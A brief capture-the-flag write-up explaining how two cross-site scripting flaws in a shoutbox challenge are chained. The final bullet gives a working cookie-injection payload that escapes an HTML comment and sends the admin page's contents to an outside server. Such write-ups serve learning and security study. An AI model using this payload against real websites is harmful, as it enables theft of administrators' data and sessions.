# Artisinal Shoutboxes (cloud, 200pts)

 * We could upload message with an author to a subdomain.
 * Admin viewed each sent message
 * There were 2 xss
 * One was in the author field, it was limited to 10 chars but that was only enforced on user side
 * Second was on `admin.combined.space`, cookie was being printed in a comment
 * Use first xss to setup second xss(using a cookie) and redirect the admin to `admin.combined.space`
 * Set the cookie prefix to `-->` to bypass the comment and then send the whole document to yourself on a different server.
 * Final cookie: `trolled=--><script>window.location='http://nazywam.host/'+document.documentElement.innerHTML</script><!--;domain=.combined.space;path=/` 
